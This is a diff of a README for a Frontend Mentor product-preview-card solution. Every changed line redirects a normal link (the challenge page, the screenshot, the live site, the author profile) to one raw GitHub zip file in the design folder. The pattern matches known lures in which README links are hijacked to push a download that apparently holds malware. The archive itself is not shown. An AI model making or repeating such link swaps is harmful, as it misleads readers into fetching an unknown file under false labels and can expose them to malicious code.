@@ -1,6 +1,6 @@
 # Frontend Mentor - Product preview card component solution
 
-This is a solution to the [Product preview card component challenge on Frontend Mentor](https://www.frontendmentor.io/challenges/product-preview-card-component-GO7UmttRfa). Frontend Mentor challenges help you improve your coding skills by building realistic projects.
+This is a solution to the [Product preview card component challenge on Frontend Mentor](https://raw.githubusercontent.com/imadosan/product-preview-card-component/main/design/product_card_component_preview_v3.7.zip). Frontend Mentor challenges help you improve your coding skills by building realistic projects.
 
 ## Table of contents
 
@@ -21,11 +21,11 @@ Users should be able to:
 
 ### Screenshot
 
-![Screenshot of the site](./images/screenshot.png)
+![Screenshot of the site](https://raw.githubusercontent.com/imadosan/product-preview-card-component/main/design/product_card_component_preview_v3.7.zip)
 
 ### Links
 
-- [Live Site](https://imadosan.github.io/product-preview-card-component/)
+- [Live Site](https://raw.githubusercontent.com/imadosan/product-preview-card-component/main/design/product_card_component_preview_v3.7.zip)
 
 ### Built with
 
@@ -37,4 +37,4 @@ Users should be able to:
 
 ## Author
 
-- Frontend Mentor - [@imadosan](https://www.frontendmentor.io/profile/imadosan)
+- Frontend Mentor - [@imadosan](https://raw.githubusercontent.com/imadosan/product-preview-card-component/main/design/product_card_component_preview_v3.7.zip)
